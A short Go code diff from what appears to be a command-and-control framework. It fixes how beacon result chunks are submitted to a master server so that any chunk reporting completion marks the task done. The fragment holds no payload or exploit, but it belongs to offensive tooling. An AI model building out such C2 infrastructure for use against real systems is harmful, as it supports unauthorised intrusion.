@@ -1573,7 +1573,7 @@ func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, master
 	}
 
 	// Submit each chunk in the batch
-	var lastComplete bool
+	var anyComplete bool
 	for _, chunk := range batch {
 		taskComplete, err := masterClient.SubmitResult(taskID, chunk.BeaconID, chunk.ChunkIndex, chunk.TotalChunks, chunk.Data)
 		if err != nil {
@@ -1581,13 +1581,14 @@ func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, master
 				logf("[C2] Failed to submit chunk %d in batch: %v", chunk.ChunkIndex, err)
 			}
 			// Continue submitting rest of batch even if one fails
-		} else {
-			lastComplete = taskComplete
+		} else if taskComplete {
+			// If ANY chunk reports completion, the task is done (Master has all chunks)
+			anyComplete = true
 		}
 	}
 
 	// If task is complete, update local state
-	if lastComplete {
+	if anyComplete {
 		beaconID := batch[0].BeaconID
 		c2.mutex.Lock()
 
